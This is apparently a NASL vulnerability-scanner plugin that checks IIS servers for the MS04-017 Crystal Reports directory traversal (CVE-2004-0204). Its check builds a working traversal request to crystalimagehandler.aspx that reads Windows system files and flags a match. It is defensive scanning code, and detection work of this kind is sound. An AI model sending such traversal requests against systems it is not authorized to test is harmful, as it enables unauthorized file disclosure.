CPE = "cpe:/a:microsoft:internet_information_services";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.101004" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-03-15 20:59:49 +0100 (Sun, 15 Mar 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 10260 );
	script_cve_id( "CVE-2004-0204" );
	script_name( "Microsoft MS04-017 security check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Christian Eric Edjenguele" );
	script_family( "Windows : Microsoft Bulletins" );
	script_dependencies( "secpod_ms_iis_detect.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "IIS/installed" );
	script_xref( name: "URL", value: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2004/ms04-017" );
	script_xref( name: "URL", value: "http://www.microsoft.com/downloads/details.aspx?FamilyId=659CA40E-808D-431D-A7D3-33BC3ACE922D&displaylang=en" );
	script_xref( name: "URL", value: "http://www.microsoft.com/downloads/details.aspx?FamilyId=9016B9F3-BA86-4A95-9D89-E120EF2E85E3&displaylang=en" );
	script_xref( name: "URL", value: "http://go.microsoft.com/fwlink/?LinkId=30127" );
	script_tag( name: "solution", value: "Microsoft has released a patch to fix this issue. Please see the references for
  more information." );
	script_tag( name: "summary", value: "A directory traversal vulnerability exists in Crystal Reports and Crystal Enterprise from Business Objects
  that could allow Information Disclosure and Denial of Service attacks on an affected system." );
	script_tag( name: "impact", value: "An attacker who successfully exploited the vulnerability could retrieve and delete files through the Crystal Reports
  and Crystal Enterprise Web interface on an affected system." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("list_array_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
for page in nasl_make_list_unique( "/CrystalReportWebFormViewer", "/CrystalReportWebFormViewer2", "/crystalreportViewers", http_cgi_dirs( port: port ) ) {
	if(page == "/"){
		page = "";
	}
	files = traversal_files( "windows" );
	for pattern in keys( files ) {
		file = files[pattern];
		url = page + "/crystalimagehandler.aspx?dynamicimage=../../../../../../../../../" + file;
		req = http_get( item: url, port: port );
		reply = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(!reply){
			continue;
		}
		header_server = egrep( pattern: "Server", string: reply, icase: TRUE );
		if(ContainsString( header_server, "Microsoft-IIS" ) && egrep( string: reply, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

